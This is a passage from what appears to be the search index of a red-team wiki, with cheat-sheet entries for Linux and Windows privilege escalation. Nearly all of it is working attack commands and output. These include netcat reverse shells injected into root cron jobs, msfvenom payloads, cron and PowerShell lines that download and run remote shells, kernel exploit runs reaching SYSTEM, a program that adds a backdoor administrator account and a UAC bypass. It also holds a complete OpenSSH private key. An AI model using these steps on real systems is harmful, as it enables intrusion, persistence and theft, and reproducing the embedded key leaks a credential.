Tasks"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#cronjob-file-insecure","text":"Cronjob file check.sh overwrite, file check.sh running as root every 1 minute. ls -l check.sh -rw-rw-rw- 1 root root <snip> check.sh Can change file check.sh with user permission. echo \"rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f\" >> check.sh","title":"Cronjob file insecure"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#path-search-order-crontab","text":"$ cat /etc/crontab <snip> SHELL = /bin/sh PATH = /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command */5 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) # ==> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin chloe@roquefort:~$ ls -ld /usr/local/bin drwxrwsrwx 2 root staff 4096 Apr 24 2020 /usr/local/bin cp /tmp/shell /usr/local/bin/run-parts https://crontab.guru : */5 : \"At every 5th minute.\" $ sudo nc -nvlp 22 listening on [ any ] 22 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 37228 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"PATH Search Order Crontab"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#module-import-hijacking","text":"","title":"Module Import Hijacking"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#dynamic-library-hijacking","text":"SHELL = /bin/bash PATH = /sbin:/bin:/usr/sbin:/usr/bin LD_LIBRARY_PATH = /usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils MAILTO = \"\" <snip> * * * * * root /usr/bin/log-sweeper ==> LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils [ hades@hades ~ ] $ ls -ld /usr/local/lib/dev drwxrwxrwx 2 root root 6 Sep 7 2020 /usr/local/lib/dev [ hades@hades ~ ] $ ls -l /usr/bin/log-sweeper -rwxr-xr-x. 1 root root 8800 Sep 4 2020 /usr/bin/log-sweeper [ hades@hades ~ ] $ /usr/bin/log-sweeper /usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory exploit msfvenom -p linux/x64/shell_reverse_tcp LHOST = 192 .168.49.158 LPORT = 6379 -f elf-so > utils.so [ hades@hades dev ] $ chmod 777 utils.so [ hades@hades dev ] $ pwd /usr/local/lib/dev $ sudo nc -nvlp 6379 listening on [ any ] 6379 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 55124 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"Dynamic Library Hijacking"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#python-module-hijacking","text":"$ cat python . py #!/usr/bin/python import sys try : import controller except Exception : print \"[!] ERROR: Unable to load controller module.\" sys . exit () controller module not found. Create file controller.py and add malicious python code. echo 'import os;os.system(\"chmod 777 /etc/passwd\")' > controller.py","title":"Python Module Hijacking"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#docker-container","text":"","title":"Docker container"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#check-being-a-container","text":"root@315d7648a173:/# ls -lah <snip> -rwxr-xr-x 1 root root 0 Jun 9 13 :01 .dockerenv","title":"Check being a container"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#mount-disk-to-docker-machine","text":"mkdir -p /mnt/hola mount /dev/sda1 /mnt/hola mount /dev/sda2 /mnt/hola mount /dev/sda3 /mnt/hola","title":"Mount disk to docker machine."},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#after-mounted","text":"Add cron job: https://github.com/MauroEldritch/GEVAUDAN/blob/master/gevaudan.rb /sbin/mount.glusterfs ip:/gluster_shared_storage /tmp/x echo '* * * * * root /bin/bash -c \"/usr/bin/wget http://ip/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell\"' > /tmp/x/snaps/gcron_enabled Change root directory mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd Add ssh public key Gen key id_rsa.pub id_rsa ssh-keygen -t rsa echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA ...key...' > /mnt/hola/root/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SK1375peajAYzOZIWV/zjsUPDs9+hxk5Ggo+cKAQKg3uImvEmQtuJKrygU03RE8EVtPw5HuViM70NLVLK2H4iSkUSSp33nWkIq1kz0yJksiKjlx2h0eXzBwQ7zeymFNr4oRvpigwEXnScOY39040h3xTqa7RikYVP4h25TtfhNExVtaZRzO6dDJSTTZurg81lkwvILHY9vw77TBP1Vsa4htYcufPKoxUDId3JllPO7Q6UTjGvlLjVf0az9Q0Kpe/D3PsAM/Wn+gCbsBkzgJ1Jhx+BFbakXto3mgdGsh3fbOLsFTX8+XTLaZNFa/faIOwUcVPvteJ2gRGe2QT6A5WV53ql3uoBnNEBwkndrWtDXyKDhPdYQXrDGZc3x2GMuM2LGkZKpM3CKv7JvUhvMj/J76380khYhFj1COOfUeQPjUmuB4Kyo5ZTDfkNXrP2CirrnGiKMOv/3hHbTSlP9t0eVQdeMQfL98NwZyRwMh9c3vQEh29PJc+BflSRJRyZhE= leecybersec@kali -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----","title":"After mounted"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#installed-and-patch-levels","text":"dpkg -l ( Debian based OSs ) rpm -qa ( CentOS / openSUSE ) uname -a","title":"Installed and Patch Levels"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#networking-enumeration","text":"","title":"Networking Enumeration"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#interface-and-routable","text":"ip a /sbin/route","title":"Interface and Routable"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#firewall-and-rules","text":"grep -Hs iptables /etc/*","title":"Firewall and Rules"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#unmounted-disks","text":"List all mounted files system mount cat /etc/fstab List all disk /bin/lsblk Mount disk sudo mount -o nolock 192 .168.11.131:/share ~/share","title":"Unmounted Disks"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#enumeration-tools","text":"Basic Linux Privilege Escalation https://gtfobins.github.io https://github.com/DominicBreuker/pspy https://github.com/rebootuser/LinEnum https://github.com/diego-treitos/linux-smart-enumeration http://pentestmonkey.net/tools/audit/unix-privesc-check","title":"Enumeration Tools"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#more-commands","text":"","title":"More Commands"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#history-bashrc-backup","text":"find / -name *history* 2 >/dev/null find / -name *backup* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null","title":"history, bashrc, backup"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#port-tunneling","text":"Local Tunneling ssh -L $myport :127.0.0.1:5985 hades@192.168.11.133 -i id_rsa Remote Tunneling ssh -R $myip : $myport :127.0.0.1:5985 kali@ $myip -i kali-idrsa SSH ESCAPE CHARACTERS ~C to type ssh command","title":"Port Tunneling"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#generate-ssh-key","text":"ssh-keygen -t rsa cp id_rsa.pub authorized_keys","title":"Generate SSH Key"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#add-user-to-sudo","text":"Create user:pass echo -e \"pass\\pass\" | adduser --gecos \"\" user usermod -aG sudo user sudo su - user","title":"Add user to sudo"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/","text":"Windows Privilege Escalation Upgrade Shell Fully interactive reverse shell on Windows Server Side stty raw -echo ; ( stty size ; cat ) | sudo nc -lvnp myport Client Side powershell IEX ( IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing ) ; Invoke-ConPtyShell myip myport File Invoke-ConPtyShell.ps1 User Enumeration Current User whoami net user <username> whoami /groups Other Users net user net localgroup administrators Hostname hostname Installed and Patch Levels wmic product get name, version, vendor dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" Patch Levels wmic qfe get Caption, Description, HotFixID, InstalledOn Device Drivers & Kernel Modules Using powershell >>> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name' , 'Start Mode' , Path Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object { $_ .DeviceName -like \"*VMware*\" } https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated OS & Architecture & Driver OS & Architecture systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" Driver Enumeration driverquery /v 6.3.9600 Kernel-Mode Drivers C: \\U sers \\k ostas \\D esktop>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6 .3.9600 N/A Build 9600 System Type: x64-based https://github.com/leecybersec/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip C: \\i netpub \\d rupal-7.54>ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" [ #] ms15-051 fixed by zcgonvh [ ! ] process with pid: 1076 created. ============================== $ sudo nc -nvlp 443 listening on [ any ] 443 ... connect to [ 10 .10.14.5 ] from ( UNKNOWN ) [ 10 .10.10.9 ] 53968 Microsoft Windows [ Version 6 .1.7600 ] Copyright ( c ) 2009 Microsoft Corporation. All rights reserved. C: \\i netpub \\d rupal-7.54>whoami whoami nt authority \\s ystem CVE-2015-1701 6.3.9600 rgnobj Integer O-flow C: \\U sers \\k ostas \\D esktop>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6 .3.9600 N/A Build 9600 System Type: x64-based wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe C: \\U sers \\k ostas \\D esktop>41020.exe 41020 .exe Microsoft Windows [ Version 6 .3.9600 ] ( c ) 2013 Microsoft Corporation. All rights reserved. C: \\U sers \\k ostas \\D esktop>whoami whoami nt authority \\s ystem https://github.com/leecybersec/walkthrough/tree/master/hackthebox/006-optimum_httpfileserver-2.3_ms16-098-6.3.9600#rgnobj-integer-overflow 6.1.7600 Ancillary Func Driver https://www.exploit-db.com/exploits/40564 c: \\w indows \\s ystem32 \\i netsrv>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" OS Name: Microsoft Windows 7 Enterprise OS Version: 6 .1.7600 N/A Build 7600 System Type: X86-based PC i686-w64-mingw32-gcc 40564 .c -o 40564 .exe -lws2_32 c: \\U sers \\P ublic>40564.exe 40564 .exe c: \\W indows \\S ystem32>whoami whoami nt authority \\s ystem Vulnerability in Ancillary Function Driver Windows MS11-046 kernel c: \\W indows \\S ystem32>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" OS Name: Microsoftr Windows Serverr 2008 Standard OS Version: 6 .0.6001 Service Pack 1 Build 6001 https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046 C: \\w amp \\w ww>MS11-046.exe MS11-046.exe c: \\W indows \\S ystem32>whoami whoami nt authority \\s ystem Scheduled Tasks schtasks /query /fo LIST /v schtasks /query /fo LIST /v | findstr /B /C: \"Task To Run\" /C: \"Next Run Time\" /C: \"Last Run Time\" /C: \"Schedule Type\" /C: \"Start Time\" /C: \"Start Date\" Readable/Writable Using accesschk accesschk.exe -accepteula accesschk.exe -uws <user> \"C:\\Program Files\" Using powershell Get-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ? { $_ .AccessToString -match \"Everyone\\sAllow\\s\\sModify\" } Get-ChildItem \"C:\\Users\\windows_10_1903_x64\\Desktop\" -Recurse | Get-ACL | findstr /C: \"<user-name>\" Processes and Services tasklist /SVC Active network connection netstat -ano Insecure File Permissions Get Server and Path to running Powershell >>> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object { $_ .State -like 'Running' } Check permission refer icacls icacls \"C:\\Windows\\system32\\wbem\\WmiApSrv.exe\" icacls Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access Overwrite file if have F or W permission. Compile code adduser.c adduser.c i686-w64-mingw32-gcc adduser.c -o adduser.exe #include <stdlib.h> int main () { int add ; add = system ( \"net user backup Adm1nP@ssWD /add\" ); add = system ( \"net localgroup administrators backup /add\" ); return 0 ; } Move file adduser.exe move adduser.exe \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\" Check StartMode for service wmic service where caption = \"Serviio\" get name, caption, state, startmode ==> StartMode: Auto Check rights for restart system whoami /priv Restart system shutdown /r /t 0 Check Administrators group net localgroup Administrators Insecure Service Permissions sc qc \"service\" accesschk64.exe -uwcqv <user> * ==> Service All Access or Service Change Config sc config \"service\" binPath = \"net localgroup administrators user /add\" sc config \"service\" binPath = \"c:\\users\\public\\shell.exe\" sc stop \"service\" sc start \"service\" https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219 Leveraging Unquoted Paths wmic service get displayname,pathname C: \\P rogram.exe C: \\P rogram Files \\M y.exe C: \\P rogram Files \\M y Program \\M y.exe C: \\P rogram Files \\M y Program \\M y service \\s ervice.exe Binaries That AutoElevate AlwaysInstallElevated https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated Enum commands reg query HKEY_CURRENT_USER \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKEY_LOCAL_MACHINE \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKLM \\S OFTWARE \\P olicies \\M icrosoft \\W indows \\I nstaller Exploit msfvenom -p windows/meterpreter/reverse_tcp lhost = 192 .168.1.120 lport = 4567 -f msi > /root/Desktop/1.msi msiexec /quiet /qn /i 1 .msi Bypass UAC registry hijacking Check Mandatory Level whoami /groups Run cmd.exe as Administrator to get High Mandatory Level powershell.exe Start-Process cmd.exe -Verb runAs C:\\Windows\\System32\\fodhelper.exe REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /v DelegateExecute /t REG_SZ REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /d \"C:\\Users\\windows_10_1903_x64\\Desktop\\shell.exe\" /f Unmounted Disks mountvol Networking Enumeration ipconfig /all route print Firewall Status and Rules netsh advfirewall show currentprofile netsh advfirewall firewall show rule name = all Enumeration Tools windows-privesc-check windows-privesc-check2.exe --help winPEASexe winPEASx86.exe More commands Add Local Admin User net user /add <user> <pass> net localgroup administrators <user> /add Run CMD as Admin powershell.exe Start-Process cmd.exe -Verb runAs Clear text stored reg query HKLM /f pass /t REG_SZ /s","title":"Windows"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#windows-privilege-escalation","text":"","title":"Windows Privilege Escalation"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#upgrade-shell","text":"Fully interactive reverse shell on Windows Server Side stty raw -echo ; ( stty size ; cat ) | sudo nc -lvnp myport Client Side powershell IEX ( IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing ) ; Invoke-ConPtyShell myip myport File Invoke-ConPtyShell.ps1","title":"Upgrade Shell"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#user-enumeration","text":"Current User whoami net user <username> whoami /groups Other Users net user net localgroup administrators Hostname hostname","title":"User Enumeration"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#installed-and-patch-levels","text":"wmic product get name, version, vendor dir \"C:\\Program Files\" dir \"C:\\Program Files (x86)\" Patch Levels wmic qfe get Caption, Description, HotFixID, InstalledOn","title":"Installed and Patch Levels"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#device-drivers-kernel-modules","text":"Using powershell >>> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name' , 'Start Mode' , Path Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object { $_ .DeviceName -like \"*VMware*\" } https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated","title":"Device Drivers &amp; Kernel Modules"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#os-architecture-driver","text":"OS & Architecture systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" Driver Enumeration driverquery /v","title":"OS &amp; Architecture &amp; Driver"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#639600-kernel-mode-drivers","text":"C: \\U sers \\k ostas \\D esktop>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6 .3.9600 N/A Build 9600 System Type: x64-based https://github.com/leecybersec/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip C: \\i netpub \\d rupal-7.54>ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" [ #] ms15-051 fixed by zcgonvh [ ! ] process with pid: 1076 created. ============================== $ sudo nc -nvlp 443 listening on [ any ] 443 ... connect to [ 10 .10.14.5 ] from ( UNKNOWN ) [ 10 .10.10.9 ] 53968 Microsoft Windows [ Version 6 .1.7600 ] Copyright ( c ) 2009 Microsoft Corporation. All rights reserved. C: \\i netpub \\d rupal-7.54>whoami whoami nt authority \\s ystem CVE-2015-1701","title":"6.3.9600 Kernel-Mode Drivers"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#639600-rgnobj-integer-o-flow","text":"C: \\U sers \\k ostas \\D esktop>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6 .3.9600 N/A Build 9600 System Type: x64-based wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe C: \\U sers \\k ostas \\D esktop>41020.exe 41020 .exe Microsoft Windows [ Version 6 .3.9600 ] ( c ) 2013 Microsoft Corporation. All rights reserved. C: \\U sers \\k ostas \\D esktop>whoami whoami nt authority \\s ystem https://github.com/leecybersec/walkthrough/tree/master/hackthebox/006-optimum_httpfileserver-2.3_ms16-098-6.3.9600#rgnobj-integer-overflow","title":"6.3.9600 rgnobj Integer O-flow"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#617600-ancillary-func-driver","text":"https://www.exploit-db.com/exploits/40564 c: \\w indows \\s ystem32 \\i netsrv>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C: \"System Type\" OS Name: Microsoft Windows 7 Enterprise OS Version: 6 .1.7600 N/A Build 7600 System Type: X86-based PC i686-w64-mingw32-gcc 40564 .c -o 40564 .exe -lws2_32 c: \\U sers \\P ublic>40564.exe 40564 .exe c: \\W indows \\S ystem32>whoami whoami nt authority \\s ystem Vulnerability in Ancillary Function Driver","title":"6.1.7600 Ancillary Func Driver"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#windows-ms11-046-kernel","text":"c: \\W indows \\S ystem32>systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" OS Name: Microsoftr Windows Serverr 2008 Standard OS Version: 6 .0.6001 Service Pack 1 Build 6001 https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046 C: \\w amp \\w ww>MS11-046.exe MS11-046.exe c: \\W indows \\S ystem32>whoami whoami nt authority \\s ystem","title":"Windows MS11-046 kernel"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#scheduled-tasks","text":"schtasks /query /fo LIST /v schtasks /query /fo LIST /v | findstr /B /C: \"Task To Run\" /C: \"Next Run Time\" /C: \"Last Run Time\" /C: \"Schedule Type\" /C: \"Start Time\" /C: \"Start Date\"","title":"Scheduled Tasks"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#readablewritable","text":"Using accesschk accesschk.exe -accepteula accesschk.exe -uws <user> \"C:\\Program Files\" Using powershell Get-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ? { $_ .AccessToString -match \"Everyone\\sAllow\\s\\sModify\" } Get-ChildItem \"C:\\Users\\windows_10_1903_x64\\Desktop\" -Recurse | Get-ACL | findstr /C: \"<user-name>\"","title":"Readable/Writable"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#processes-and-services","text":"tasklist /SVC Active network connection netstat -ano","title":"Processes and Services"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#insecure-file-permissions","text":"Get Server and Path to running Powershell >>> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object { $_ .State -like 'Running' } Check permission refer icacls icacls \"C:\\Windows\\system32\\wbem\\WmiApSrv.exe\" icacls Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access Overwrite file if have F or W permission. Compile code adduser.c adduser.c i686-w64-mingw32-gcc adduser.c -o adduser.exe #include <stdlib.h> int main () { int add ; add = system ( \"net user backup Adm1nP@ssWD /add\" ); add = system ( \"net localgroup administrators backup /add\" ); return 0 ; } Move file adduser.exe move adduser.exe \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\" Check StartMode for service wmic service where caption = \"Serviio\" get name, caption, state, startmode ==> StartMode: Auto Check rights for restart system whoami /priv Restart system shutdown /r /t 0 Check Administrators group net localgroup Administrators","title":"Insecure File Permissions"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#insecure-service-permissions","text":"sc qc \"service\" accesschk64.exe -uwcqv <user> * ==> Service All Access or Service Change Config sc config \"service\" binPath = \"net localgroup administrators user /add\" sc config \"service\" binPath = \"c:\\users\\public\\shell.exe\" sc stop \"service\" sc start \"service\" https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219","title":"Insecure Service Permissions"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#leveraging-unquoted-paths","text":"wmic service get displayname,pathname C: \\P rogram.exe C: \\P rogram Files \\M y.exe C: \\P rogram Files \\M y Program \\M y.exe C: \\P rogram Files \\M y Program \\M y service \\s ervice.exe","title":"Leveraging Unquoted Paths"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#binaries-that-autoelevate","text":"","title":"Binaries That AutoElevate"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#alwaysinstallelevated","text":"https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated Enum commands reg query HKEY_CURRENT_USER \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKEY_LOCAL_MACHINE \\S oftware \\P olicies \\M icrosoft \\W indows \\I nstaller reg query HKLM \\S OFTWARE \\P olicies \\M icrosoft \\W indows \\I nstaller Exploit msfvenom -p windows/meterpreter/reverse_tcp lhost = 192 .168.1.120 lport = 4567 -f msi > /root/Desktop/1.msi msiexec /quiet /qn /i 1 .msi","title":"AlwaysInstallElevated"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#bypass-uac-registry-hijacking","text":"Check Mandatory Level whoami /groups Run cmd.exe as Administrator to get High Mandatory Level powershell.exe Start-Process cmd.exe -Verb runAs C:\\Windows\\System32\\fodhelper.exe REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /v DelegateExecute /t REG_SZ REG ADD HKCU \\S oftware \\C lasses \\m s-settings \\S hell \\O pen \\c ommand /d \"C:\\Users\\windows_10_1903_x64\\Desktop\\shell.exe\" /f","title":"Bypass UAC registry hijacking"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#unmounted-disks","text":"mountvol","title":"Unmounted Disks"},{"location":"red-teaming/network-pentest/privilege-escalation/Windows/#networking-enumeration","text":"ipconfig /all route print","title":"Networking 